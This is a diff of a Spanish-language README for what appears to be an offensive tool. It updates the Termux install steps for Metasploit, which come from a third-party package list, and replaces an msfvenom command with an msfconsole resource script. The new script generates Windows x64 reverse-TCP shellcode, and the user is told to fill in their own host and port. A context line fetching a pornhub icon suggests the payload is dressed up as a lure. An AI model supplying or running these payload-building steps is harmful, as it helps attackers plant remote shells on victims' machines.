@@ -20,7 +20,7 @@ python3 -m pip --no-cache-dir install wave
 ```
 NOTA: en distribuciones Linux pillow y numpy se instala desde PIP.
 
-METASPLOIT-FRAMEWORK with Ivam3 [Termux-packages](https://github.com/ivam3/termux-packages) :
+METASPLOIT-FRAMEWORK con [Termux-packages](https://github.com/ivam3/termux-packages) de @Ivam3 :
 ```bash
 mkdir -p $PREFIX/etc/apt/sources.list.d
 curl https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -o $PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list
@@ -41,7 +41,13 @@ curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o venv/pornhub.
 
 - Payload|Shellcode:
 ```bash
-msfvenom -p windows/x86/shell_reverse_tcp LHOST 0.0.0.0 LPORT 0000 -f raw -o venv/shellcode.bin
+echo """use payload/windows/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 0000
+generate -f raw -o venv/shellcode.bin
+""" > venv/msfshellcode.rc 
+
+msfconsole -q -r venv/msfshellcode.rc
 ```
 Sustituye 0.0.0.0 por tu Protocolo de Internet Local (IPL) y el '0000' por el puerto de tu eleccion.
 
